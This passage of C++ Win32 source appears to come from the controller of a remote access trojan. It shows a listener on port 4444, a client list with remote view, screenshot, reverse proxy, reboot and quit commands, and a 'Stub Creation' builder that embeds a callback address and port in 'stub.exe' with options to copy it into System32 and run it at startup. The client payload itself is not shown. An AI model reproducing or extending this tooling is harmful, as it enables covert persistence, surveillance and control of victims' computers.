				wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
				RegisterClassExW(&wcex);

				RECT rect;
				GetClientRect(GetDesktopWindow(), &rect);


				HWND hBuild = CreateWindow(L"StubCreation", L"", NULL, rect.left + (rect.right - rect.left - 400) / 2,
					rect.top + (rect.bottom - rect.top - 400) / 2, 500, 300, NULL, NULL, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
				GetLastError();


				SetWindowLong(hBuild, GWL_STYLE, WS_BORDER);
				ShowWindow(hBuild, SW_SHOW);

			}
			break;
			case IDM_SETTINGS:
				
				if (cMini == NULL)
				{
					cMini = CreateWindow(L"BUTTON", L"Minimize to tray", WS_VISIBLE | WS_TABSTOP | WS_CHILD | BS_CHECKBOX,
						650, 75, 130, 20, hWnd, (HMENU)IDC_MINI, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
					/*sIP = CreateWindow(L"STATIC", L"Connection Address", WS_VISIBLE | WS_CHILD | WS_TABSTOP | SS_OWNERDRAW,
						650, 95, 100, 10, hWnd, NULL, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);*/
					sPort = CreateWindow(L"STATIC", L"Connection Port", WS_VISIBLE | WS_CHILD | SS_OWNERDRAW,
						650, 120, 100, 10, hWnd, NULL, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
					/*seIP = CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_TABSTOP | ES_AUTOHSCROLL | WS_BORDER,
						650, 105, 100, 12, hWnd, (HMENU)IDC_SIP, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);*/
					sePort = CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_TABSTOP | WS_BORDER,
						650, 132, 80, 12, hWnd, (HMENU)IDC_SPORT, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
					hApply = CreateWindow(L"BUTTON", L"Apply", WS_VISIBLE | WS_CHILD | WS_TABSTOP | BS_OWNERDRAW,
						750, 150, 45, 20, hWnd, (HMENU)IDC_APPLY, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
					SetWindowSubclass(hApply, ButtonProc, NULL, NULL);
				}
				else
					if (ShowWindow(cMini, SW_SHOW))
					{
						ShowWindow(cMini, SW_HIDE);
						ShowWindow(sIP, SW_HIDE);
						ShowWindow(sPort, SW_HIDE);
						ShowWindow(seIP, SW_HIDE);
						ShowWindow(sePort, SW_HIDE);
						ShowWindow(hApply, SW_HIDE);
					}
					else
					{
						ShowWindow(cMini, SW_SHOW);
						ShowWindow(sIP, SW_SHOW);
						ShowWindow(sPort, SW_SHOW);
						ShowWindow(seIP, SW_SHOW);
						ShowWindow(sePort, SW_SHOW);
						ShowWindow(hApply, SW_SHOW);
					}

					


				
				
				break;
			/*case IDM_NAME:
			{
				LV_DISPINFO pLvdi = { 0 };
				pLvdi.hdr.code = LVN_BEGINLABELEDIT;


				SendMessage(hWnd, WM_NOTIFY, IDS_APP_TITLE, (LPARAM)&pLvdi);
				break;

			}*/
			case IDM_CLEARHISTORY:
				if (CheckMenuItem(GetMenu(hWnd), IDM_CLEARHISTORY, MF_CHECKED)) {
					CheckMenuItem(GetMenu(hWnd), IDM_CLEARHISTORY, MF_UNCHECKED);
					
					gBage.CLEAR = NULL;
				}
				else
				{
					gBage.CLEAR = TRUE;
					CheckMenuItem(GetMenu(hWnd), IDM_HISTORY, MF_UNCHECKED);
				}
				break;
			case IDM_HISTORY:
				if (CheckMenuItem(GetMenu(hWnd), IDM_HISTORY, MF_CHECKED)) {
					CheckMenuItem(GetMenu(hWnd), IDM_HISTORY, MF_UNCHECKED);
					HISTORY = FALSE;
				}
				else
				{
					HISTORY = TRUE;
					CheckMenuItem(GetMenu(hWnd), IDM_CLEARHISTORY, MF_UNCHECKED);
				}
				break;
			case ID__FILETRANSFER:
				MessageBox(NULL, NULL, NULL, NULL);
				break;
			case ID__REMOTEVIEW:
				//_rHandle->Remote_Administration(_Handle);
				sInit._cHandler->Multi_Client_Helper(_Handle, Remote, Remote, _Handle->Clicked_Item);
				//MessageBox(NULL, NULL, NULL, NULL);
				break;

			case ID__REFRESH:

				if(_rHandle->IsRemote())
					sInit._cHandler->Refresh_Client_List(_Handle);
				else
					MessageBox(NULL, L"Please close all remote sessions before refreshing", NULL, NULL);
				break;
				
				break;
			case ID__REBOOT:
			{
				sInit._cHandler->Multi_Client_Helper(_Handle, Reboot, Reboot, _Handle->Clicked_Item);
				break;
			}
			case ID__QUIT:
				sInit._cHandler->Multi_Client_Helper(_Handle, Quit, Quit, _Handle->Clicked_Item);
				break;
			case ID__SCREENY:
				sInit._cHandler->Multi_Client_Helper(_Handle, Screeny, Screeny, HIWORD(wParam));
				break;
			case ID__RPROX:
				sInit._cHandler->Multi_Client_Helper(_Handle, RProxy, RProxy, _Handle->si.picked);
				break;
			case IDM_RPROX:
				RP->Initiate_Proxy(_Handle);
				break;
			case IDM_SCREENY:
				_Handle->SCREENY = TRUE;
				int i;
				i = _Handle->Clicked_Item;
				
				if (CreateStreamOnHGlobal(NULL, true, &_Handle->si.Connections[i].ScreenShot) == S_OK)
				{
					ULONG Bytes;
					BYTE* buffer = new BYTE[_Handle->si.Connections[i].ssSize];
					buffer = _rHandle->Remote_Thread(_Handle);
					if (_Handle->si.Connections[i].ScreenShot->Write(buffer, _Handle->si.Connections[i].ssSize, &Bytes) == S_OK)
					{
						LARGE_INTEGER li;
						li.QuadPart = 0;
						if (_Handle->si.Connections[i].ScreenShot->Seek(li, STREAM_SEEK_SET, NULL) == S_OK)
						{

						//	LineTo(hdcMem, 645, 335);
							HDC hdc = GetDC(_Handle->mhWnd);
							Gdiplus::Graphics graphics(hdc);
							Gdiplus::Image* image = Gdiplus::Image::FromStream(_Handle->si.Connections[i].ScreenShot);

							Gdiplus::Rect destRect(646, 120, 153, 149);
							graphics.DrawImage(image, destRect);

							delete image;
							DeleteDC(hdc);
						}

					}
				
					delete buffer;
					_Handle->si.Connections[i].ScreenShot->Release();
					_Handle->si.Connections[i].ScreenShot = nullptr;
					_Handle->SCREENY = FALSE;
				}
				
					break;
			case IDM_REMOTEINIT:
				_rHandle->Remote_Administration(_Handle);
				break;
			case IDM_START:
				if (Init->data.port <= NULL)
				{
					
					//break;
					Init->data.port = 4444;
					wcstombs(Init->data.URL, L"127.0.0.1", 10);

				}
				_Handle->si.ConnectionCounter = 0;
				_Handle->start = TRUE;
				ShowWindow(stopButton, SW_SHOW);
				ShowWindow(startButton, SW_HIDE);

				wss << "Listening..  On Port:" << Init->data.port;
				//wss << "Listening..   " << Init->data.URL << L":"<< Init->data.port;
				wStr = wss.str();
				SetWindowText(bBar, wStr.c_str());
				_Handle->Tray->UpdateTray(&_Handle->Tray->nID, _Handle->start, _Handle->si.ConnectionCounter);
				Init->Initialize(_Handle, Init);
				break;
			case IDM_SHOW:
				ShowWindow(hWnd, SW_SHOW);
				UpdateWindow(hWnd);
				break;
			case IDC_MINI:
				isChecked = IsDlgButtonChecked(hWnd, IDC_MINI);
				if (isChecked)
					CheckDlgButton(hWnd, IDC_MINI, BST_UNCHECKED);
				else
					CheckDlgButton(hWnd, IDC_MINI, BST_CHECKED);
				break;
			case IDM_STOP:
				_Handle->start = FALSE;
				InvalidateRect(bBar, NULL, TRUE);
				SetWindowText(bBar, L" ");
				//
				//UpdateWindow(bBar);
				closesocket(_Handle->si.ListenSocket);
				WSACleanup();
				//Clear List//
				ListView_DeleteAllItems(_Handle->hWndList);
				_Handle->si.ConnectionCounter = NULL;
				_Handle->Tray->UpdateTray(&_Handle->Tray->nID, _Handle->start, _Handle->si.ConnectionCounter);
				ShowWindow(startButton, SW_SHOW);
				ShowWindow(stopButton, SW_HIDE);
				break;
            case IDM_ABOUT:
                DialogBox(_Handle->hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
				//rwhWnd = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ReadWriteMain, NULL, NULL, NULL);
				//
				 DestroyWindow(hWnd);
                break;
			


			case IDC_APPLY:
			{

				if (_Handle->start)
				{
					WasListen = TRUE;
					SendMessage(_Handle->mhWnd, WM_COMMAND, IDM_STOP, NULL);
				}

				wchar_t wPort[256];
				GetDlgItemText(hWnd, IDC_SPORT, wPort, 256);
				Init->data.port = _wtoi(wPort);
				//wchar_t wIP[256];
				//GetDlgItemText(hWnd, IDC_SIP, wIP, 256);

				//wcstombs(Init->data.URL, wIP, 256);
				//MessageBox(NULL, L"Applied!", L"L33T", NULL);
				if (WasListen)
					SendMessage(_Handle->mhWnd, WM_COMMAND, IDM_START, NULL);
				break;
			}
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
			HDC hdcMem = GetDC(hWnd);
			HPEN hp = CreatePen(PS_SOLID, 1, RGB(80, 80, 80));
			SelectObject(hdcMem, hp);
			MoveToEx(hdcMem, 678, 49, 0);
			LineTo(hdcMem, 678, 65);
			MoveToEx(hdcMem, 0, 30, 0);
			LineTo(hdcMem, 800, 30);
			MoveToEx(hdcMem, 0, 70, 0);
			LineTo(hdcMem, 800, 70);
			MoveToEx(hdcMem, 645, 70, 0);
			LineTo(hdcMem, 645, 335);
			MoveToEx(hdcMem, 0, 335, 0);
			LineTo(hdcMem, 800, 335);
			EndPaint(hWnd, &ps);
			
        }
        break;
    case WM_DESTROY:
		
		
		
	//	if (HISTORY) {
	//		rwhWnd = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ReadWriteMain, NULL, NULL, NULL);
			
	//	}
		//else {

		//	DestroyWindow(hWnd);
			PostQuitMessage(0);
			//CloseHandle(hWnd);
			//ExitThread(0);
		//}

		
       // 
		
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}
LRESULT CALLBACK StubCreationProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	BOOL isChecked = FALSE;
	switch (Message)
	{
	case WM_CREATE:
	{
		bTitle = CreateWindow(L"STATIC", L"Stub Creation", WS_VISIBLE | WS_CHILD | SS_OWNERDRAW,
			10, 15, 100, 20, hWnd, NULL, NULL, NULL);
		hURL = CreateWindow(L"STATIC", L"Connection Address", WS_VISIBLE | WS_CHILD | WS_TABSTOP | SS_OWNERDRAW,
			50, 60, 100, 10, hWnd, NULL, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
		hPort = CreateWindow(L"STATIC", L"Connection Port", WS_VISIBLE | WS_CHILD | SS_OWNERDRAW,
			50, 95, 100, 10, hWnd, NULL, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
		eURL = CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_TABSTOP | ES_AUTOHSCROLL | WS_BORDER,
			50, 70, 100, 12, hWnd, (HMENU)IDC_IP, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
		ePort = CreateWindow(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_TABSTOP | WS_BORDER,
			50, 106, 80, 12, hWnd, (HMENU)IDC_PORT, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
		hSName = CreateWindow(L"STATIC", L"Stub Name", WS_VISIBLE | WS_CHILD | SS_OWNERDRAW,
			50, 125, 80, 10, hWnd, NULL, NULL, NULL);
		eSName = CreateWindow(L"EDIT", L"stub.exe", WS_VISIBLE | WS_CHILD | ES_AUTOHSCROLL | WS_BORDER | WS_TABSTOP,
			50, 136, 80, 12, hWnd, (HMENU)IDC_STUBNAME, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
		cSys32 = CreateWindow(L"BUTTON", L"Add To Sys32", WS_VISIBLE | WS_TABSTOP | WS_CHILD | BS_CHECKBOX,
			250, 60, 110, 20, hWnd, (HMENU)IDC_SYS32, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
		cStart = CreateWindow(L"BUTTON", L"Run At Startup", WS_VISIBLE | WS_TABSTOP | WS_CHILD | BS_CHECKBOX,
			250, 85, 115, 20, hWnd, (HMENU)IDC_STARTUP, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
		//SetWindowTheme(cSys32, L"wstr", L"wstr");
		

		hCreate = CreateWindow(L"BUTTON", L"Build", WS_VISIBLE | WS_CHILD | WS_TABSTOP | BS_OWNERDRAW,
			450, 250, 30, 15, hWnd, (HMENU)IDC_CREATE, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
		bCancel = CreateWindow(L"BUTTON", L"Cancel", WS_VISIBLE | WS_CHILD | WS_TABSTOP | BS_OWNERDRAW,
			20, 250, 40, 15, hWnd, (HMENU)IDC_CANCEL, (HINSTANCE)GetWindowLong(hWnd, GWL_HINSTANCE), NULL);
		//	BBG = CreateWindow(L"STATIC", L"Build", WS_VISIBLE | WS_CHILD | SS_OWNERDRAW,
		//		78, 20, 40, 15, hWnd, NULL, NULL, NULL);

		SetWindowSubclass(hCreate, ButtonProc, NULL, NULL);
		SetWindowSubclass(bCancel, ButtonProc, NULL, NULL);
		SetWindowSubclass(hApply, ButtonProc, NULL, NULL);

	}
	case WM_DRAWITEM:
	{
		LPDRAWITEMSTRUCT pDIS = (LPDRAWITEMSTRUCT)lParam;


		if (pDIS->hwndItem == bTitle)
		{
			SetTextColor(pDIS->hDC, RGB(255, 255, 255));
			WCHAR staticText[99];
			int len = SendMessage(bTitle, WM_GETTEXT,
				ARRAYSIZE(staticText), (LPARAM)staticText);

			SelectObject(pDIS->hDC, hFontSb);
			TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, staticText, len);

		}
		if (pDIS->hwndItem == hSName)
		{

			//SetTextColor(pDIS->hDC, RGB(255, 2, 2));
			WCHAR staticText[99];
			int len = SendMessage(hSName, WM_GETTEXT,
				ARRAYSIZE(staticText), (LPARAM)staticText);
			SetTextColor(pDIS->hDC, RGB(255, 255, 255));
			SelectObject(pDIS->hDC, hFontSm);
			TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, staticText, len);
			return 0;
		}
		if (pDIS->hwndItem == hPort)
		{
			WCHAR staticText[99];
			int len = SendMessage(hPort, WM_GETTEXT,
				ARRAYSIZE(staticText), (LPARAM)staticText);
			SetTextColor(pDIS->hDC, RGB(255, 255, 255));
			SelectObject(pDIS->hDC, hFontSm);
			TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, staticText, len);
			return 0;
		}
		if (pDIS->hwndItem == hURL)
		{
			WCHAR staticText[99];
			int len = SendMessage(hURL, WM_GETTEXT,
				ARRAYSIZE(staticText), (LPARAM)staticText);
			SetTextColor(pDIS->hDC, RGB(255, 255, 255));
			SelectObject(pDIS->hDC, hFontSm);
			TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, staticText, len);
			return 0;
		}
		if (pDIS->hwndItem == hCreate)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSe);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSe);

			return 0;
		}
		if (pDIS->hwndItem == bCancel)
		{
			if (!HOVER)
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(255, 255, 255), hFontSe);

			else
				DrawItemStatic(pDIS->hwndItem, pDIS, RGB(2, 244, 235), hFontSe);

			return 0;
		}
		//if (pDIS->hwndItem == hApply)
		//{
		//	SetTextColor(pDIS->hDC, RGB(255, 255, 255));
		//	WCHAR staticText[99];
		//	int len = SendMessage(hApply, WM_GETTEXT,
		//		ARRAYSIZE(staticText), (LPARAM)staticText);

		//	SelectObject(pDIS->hDC, hFont);
		//	TextOut(pDIS->hDC, pDIS->rcItem.left, pDIS->rcItem.top, staticText, len);
		//	return 0;
		//}


		break;
	}
	case WM_COMMAND:
	{
		int wmId = LOWORD(wParam);
		switch (wmId)
		{
		case IDC_CANCEL:
		{
			DestroyWindow(hWnd);
			break;
		}
		case IDC_SYS32:
		{
			isChecked = IsDlgButtonChecked(hWnd, IDC_SYS32);
			if (isChecked)
				CheckDlgButton(hWnd, IDC_SYS32, BST_UNCHECKED);
			else
				CheckDlgButton(hWnd, IDC_SYS32, BST_CHECKED);
			break;
		}
		case IDC_STARTUP:
			isChecked = IsDlgButtonChecked(hWnd, IDC_STARTUP);
			if (isChecked)
				CheckDlgButton(hWnd, IDC_STARTUP, BST_UNCHECKED);
			else
				CheckDlgButton(hWnd, IDC_STARTUP, BST_CHECKED);
			break;

		case IDC_CREATE:

			//if (_Handle->start)
			//{
			//	WasListen = TRUE;
			//	SendMessage(_Handle->mhWnd, WM_COMMAND, IDM_STOP, NULL);
			//}
			wchar_t wPort[256];
			GetDlgItemText(hWnd, IDC_PORT, wPort, 256);
			Init->data.port = _wtoi(wPort);
			wchar_t wIP[256];
			GetDlgItemText(hWnd, IDC_IP, wIP, 256);
			wchar_t sName[256];
			GetDlgItemText(hWnd, IDC_STUBNAME, sName, 256);

			Init->data.Sys32 = IsDlgButtonChecked(hWnd, IDC_SYS32);
			Init->data.Startup = IsDlgButtonChecked(hWnd, IDC_STARTUP);

			wcstombs(Init->data.URL, wIP, 256);
			if (CreateStub(IsDlgButtonChecked(hWnd, IDC_RAMORNAH), sName))
			{
				MessageBox(NULL, L"Stub Created And Applied!", L"L33T", NULL);
				if (WasListen)
					SendMessage(_Handle->mhWnd, WM_COMMAND, IDM_START, NULL);
			}
			else
				MessageBox(NULL, L"Stub Creation Failed!", L"3rr", NULL);
			break;
		}
	}
	case WM_CTLCOLOREDIT:
	{

		HDC hdcButton = (HDC)wParam;
		SetBkColor(hdcButton, RGB(0x2C, 0x2C, 0x2C));
		SetTextColor(hdcButton, RGB(255, 255, 255));
		SelectObject(hdcButton, hFontSm);
		return (LRESULT)CreateSolidBrush(RGB(0x2C, 0x2C, 0x2C));

	}
	case WM_CTLCOLORBTN:
	{
		//HDC hdcButton = (HDC)wParam;
		//SetBkColor(hdcButton, RGB(200, 0, 0));

		HDC hdcButton = (HDC)wParam;
		SetBkColor(hdcButton, RGB(0x2C, 0x2C, 0x2C));
		SelectObject(hdcButton, hFontSm);
		//SetTextColor(hdcButton, RGB(255, 255, 255));
		return (LRESULT)CreateSolidBrush(RGB(0x2C, 0x2C, 0x2C));


	}
	break;
	case WM_CTLCOLORSTATIC:
	{

		//	if (lParam == (LPARAM)sTitle || lParam == (LPARAM)bBar || lParam == (LPARAM)hVer)
		//{
		HDC hdcButton = (HDC)wParam;
		SetBkColor(hdcButton, RGB(0x2C, 0x2C, 0x2C));
		SetTextColor(hdcButton, RGB(255, 255, 255));
		SelectObject(hdcButton, hFontSm);
		return (LRESULT)CreateSolidBrush(RGB(0x2C, 0x2C, 0x2C));
		//}

	}
	case WM_NCHITTEST:
		UINT uHitTest;

		uHitTest = DefWindowProc(hWnd, WM_NCHITTEST, wParam, lParam);
		if (uHitTest == HTCLIENT)
			return HTCAPTION;
		return uHitTest;
		break;
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		HDC hdcMem = GetDC(hWnd);
		HPEN hp = CreatePen(PS_SOLID, 1, RGB(80, 80, 80));
		SelectObject(hdcMem, hp);
		MoveToEx(hdcMem, 0, 32, 0);
		LineTo(hdcMem, 500,32 );
		MoveToEx(hdcMem, 0, 265, 0);
		LineTo(hdcMem, 500, 265);
		EndPaint(hWnd, &ps);


		break;
	}
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);


	}


	return 0;
}
int ReadEOF()
{
	wchar_t lpTempName[MAX_PATH + 1];
	wchar_t lpTempPath[MAX_PATH + 1]; 
	wchar_t lpFileName[MAX_PATH + 1];
	HANDLE tmpFile = NULL;
	HANDLE hFile = NULL;
	BYTE tmpBuffer[FileSize + 1];
	DWORD rIn;
	DWORD wIn;
	GetTempPath(MAX_PATH, lpTempPath);
	GetModuleFileName(NULL, lpFileName, MAX_PATH + 1);

	
	
	
	std::wstring tpstr = lpTempPath;
	int tpsize = tpstr.size();
	std::wstring tnstr = lpFileName;
	PathRemoveFileSpec(lpFileName);
	std::wstring fnstr = lpFileName;
	int fnsize = fnstr.size();
	if (fnsize + 1 == tpsize)
	{
		tmpFile = CreateFile(tnstr.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		GetLastError();
		SetFilePointer(tmpFile, 0, NULL, FILE_BEGIN);
		ReadFile(tmpFile, &tmpBuffer, FileSize, &rIn, NULL);
		SetFilePointer(tmpFile, FileSize, NULL, FILE_BEGIN);
		ReadFile(tmpFile, &gBage, sizeof(Garbage), NULL, NULL);
		mbstowcs(lpFileName, gBage.FilePath, MAX_PATH + 1);
		hFile = CreateFile(lpFileName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

		if (gBage.CLEAR == 1)
		{
			SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
			WriteFile(hFile, &tmpBuffer, FileSize, &wIn, NULL);
			GetLastError();
			SetFilePointer(hFile, FileSize, NULL, FILE_BEGIN);
			BYTE cork[528];
			memset(cork, 0, 528);
			WriteFile(hFile, &cork, 528, &wIn, NULL);

		}
		else
		{
			SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
			WriteFile(hFile, &tmpBuffer, FileSize, &wIn, NULL);
			SetFilePointer(hFile, FileSize, NULL, FILE_BEGIN);
			WriteFile(hFile, &gBage, sizeof(gBage), &wIn, NULL);

		}
		ExitProcess(0);
	}
	else
	{
		tmpFile = CreateFile(tnstr.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		SetFilePointer(tmpFile, FileSize, NULL, FILE_BEGIN);
		ReadFile( tmpFile, &gBage, sizeof(Garbage), &rIn, NULL); 
		CloseHandle(tmpFile);
		if (gBage.LastPORT != NULL)
			FULL = TRUE;
	}



	return 0;
}

void ReadWriteMain()
{

	HANDLE hFile = NULL;
	HANDLE tmpFile = NULL;
	wchar_t lpFileName[MAX_PATH + 1];
	wchar_t lpTempPath[MAX_PATH + 1];
	HRSRC hrsrc = NULL;
	HGLOBAL hGlbl = NULL;
	BYTE *pExeResource = NULL;
	BYTE lpBuffer[FileSize];
	DWORD rIn = NULL;
	DWORD wIn = NULL;
	//DWORD dwSize = 8192;
	GetModuleFileName(NULL, lpFileName, MAX_PATH + 1);
	GetTempPath(MAX_PATH, lpTempPath);
	std::wstringstream wss;
	wss << lpTempPath << L"tmpAeiro.tmp";
	std::wstring wStr = wss.str();

	tmpFile = CreateFile(wStr.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	hFile = CreateFile(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	GetLastError();
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	ReadFile(hFile, &lpBuffer, FileSize, &rIn, NULL);

	WriteFile(tmpFile, &lpBuffer, rIn, &wIn, NULL);
	Garbage *gBages = new Garbage;

	
	gBages->CLEAR = gBage.CLEAR;
	wchar_t cwchar[257];// = wStr.c_str();
	//LPCWSTR lpwstr;
	wcscpy(cwchar, wStr.c_str());
	//wcscat(cwchar, wStr.c_str());
	wcstombs(gBages->FilePath, lpFileName, sizeof(lpFileName));
	strcpy(gBages->LastURL, Init->data.URL);
	gBages->LastPORT = Init->data.port;
	SetFilePointer(hFile,FileSize, NULL, FILE_BEGIN);
	WriteFile(tmpFile, gBages, sizeof(Garbage), &wIn, NULL);
	CloseHandle(tmpFile);
	STARTUPINFO sui;
	PROCESS_INFORMATION pi;
	memset(&sui, 0, sizeof(sui));
	memset(&pi, 0, sizeof(pi));
	GetLastError();
	
	CreateProcess(cwchar ,NULL, NULL, NULL, FALSE,NORMAL_PRIORITY_CLASS, NULL, NULL, &sui, &pi);
	//return;
	PostQuitMessage(0);
	ExitProcess(0);
	GetLastError();
	//ResumeThread(pi.hThread);

	
}
// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

//**************************************************************************** /
int CreateListColumns(HWND hWndParent, Packet_Handler* _Handle)
{
	
	RECT rcl;           // Rectangle for setting the size of the window
	int index;          // Index used in for loops
	wchar_t szText[520];    // Place to store some text



		// List view item structure
		   // Index for inserting sub items

						// Ensure that the common control DLL is loaded.
	InitCommonControls();

	// Get the size and position of the parent window
	GetClientRect(hWndParent, &rcl);

	// Create the list view window that starts out in report view
	// and allows label editing.

	_Handle->hWndList = CreateWindowEx(0L,
		WC_LISTVIEW,                // list view class
		L"",                         // no default text
		WS_VISIBLE | WS_CHILD | LVS_REPORT | LVS_OWNERDATA| LVS_NOCOLUMNHEADER | //| WS_BORDER  | WS_EX_CLIENTEDGE
		LVS_EDITLABELS, 
		-16, 95,
		661, 240,
		hWndParent,
		(HMENU)IDS_APP_TITLE,
		_Handle->hInst,
		NULL);

	if (_Handle->hWndList == NULL)
		return NULL;
	SendMessage(_Handle->hWndList, LVM_SETEXTENDEDLISTVIEWSTYLE, 0, LVS_EX_FULLROWSELECT);
	// Now initialize the columns we will need
	// Initialize the LV_COLUMN structure
	// the mask specifies that the .fmt, .ex, width, and .subitem members 
	// of the structure are valid,
	
	_Handle->lvC.mask = LVCF_FMT | LVCF_WIDTH | LVCF_SUBITEM;
	_Handle->lvC.fmt = LVCFMT_CENTER;  // left align the column
	_Handle->lvC.cx = 0;            // width of the column, in pixels
	
	//_Handle->lvC.pszText = NULL;

	// Add the columns.


		for (index = 0; index <= NUM_COLUMNS; index++)
		{
			//_Handle->lvC.iSubItem = index;
			//LoadStringW(_Handle->hInst,
			//	IDS_CLIENT_NAME + index,
			//	szText,
			//	sizeof(szText));
			if(index > 0)
				_Handle->lvC.cx = 165;
			if (ListView_InsertColumn(_Handle->hWndList, index, &_Handle->lvC) == -1)
				return NULL;
		}


/*	else
	{
		_Handle->hWndList = NULL;
		for (index = 0; index <= NUM_COLUMNS; index++)
		{
			_Handle->lvC.iSubItem = index;
			LoadStringW(_Handle->hInst,
				IDS_CLIENT_NAME + index,
				szText,
				sizeof(szText));
			if (ListView_DeleteColumn(_Handle->hWndList, index, &_Handle->lvC) == -1)
				return NULL;
		}
	}
	/*

	*/
	return 0;
}

LRESULT NotifyHandler(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam, Packet_Handler* _Handle)
{
	LV_DISPINFO *pLvdi = (LV_DISPINFO *)lParam;
	NM_LISTVIEW *pNm = (NM_LISTVIEW *)lParam;
	NMITEMACTIVATE* NMItem = { 0 };
	//_Handle->Clients[_Handle->si.ConnectionCounter] = (_Handle->_Clients *)(pLvdi->item.lParam);
	//wchar_t szText[10];

	if (wParam != IDS_APP_TITLE)
		return 0L;


	switch (((LPNMHDR)lParam)->code)
	{

	case NM_RCLICK:
	{
		POINT cursor;
		GetCursorPos(&cursor);
		for (int i = 0; i < 100; i++)
		{
			if (_Handle->si.Connections[i].s[0] != NULL)
			{
				NMItem = ((LPNMITEMACTIVATE)lParam);
				//if (NMItem->iItem < 0) break;
				
				// pLvdi->item.iItem;
				LVHITTESTINFO lVht;
				memset(&lVht, 0, sizeof(LVHITTESTINFO));
				lVht.pt = NMItem->ptAction;
				//lVht.flags = LVHT_ONITEM;
				
				int item = ListView_SubItemHitTest(_Handle->hWndList, &lVht);
				//int item;// = ListView_SubItemHitTest(hWnd, &lVht);
				//	item = SendMessage(hWnd, LVM_SUBITEMHITTEST, 0, (LPARAM)&lVht);
				_Handle->Clicked_Item =item;
				 // Creating the pop-up menu list
				TrackPopupMenu((HMENU)GetSubMenu(LoadMenu(_Handle->hInst, MAKEINTRESOURCE(IDR_CONTEXT)), 0),
					TPM_LEFTALIGN | TPM_RIGHTBUTTON, cursor.x, cursor.y, 0, hWnd, NULL);
				break;
			}
			else
			{
				if(_Handle->si.ConnectionCounter != 0)
				TrackPopupMenu((HMENU)GetSubMenu(LoadMenu(_Handle->hInst, MAKEINTRESOURCE(IDR_CONTEXTR)), 0),
					TPM_LEFTALIGN | TPM_RIGHTBUTTON, cursor.x, cursor.y, 0, hWnd, NULL);
				break;
			}
			
		}
		break;
	}
	case NM_CLICK:
	{


		NMItem = ((LPNMITEMACTIVATE)lParam);
		LVHITTESTINFO lVht;
		lVht.pt = NMItem->ptAction;
		int item = ListView_SubItemHitTest(_Handle->hWndList, &lVht);
		if (item < 0)
			break;
		_Handle->Clicked_Item = item;
		SendMessage(_Handle->mhWnd, WM_COMMAND, MAKEWPARAM(ID__SCREENY,item),0);
		//ListView_SetItemState(_Handle->hWndList, item, LVIS_SELECTED, NULL);

		break;
	}
	
	case NM_DBLCLK:
		{
			NMItem = ((LPNMITEMACTIVATE)lParam);
			LVHITTESTINFO lVht;
			memset(&lVht, 0, sizeof(LVHITTESTINFO));
			lVht.pt = NMItem->ptAction;
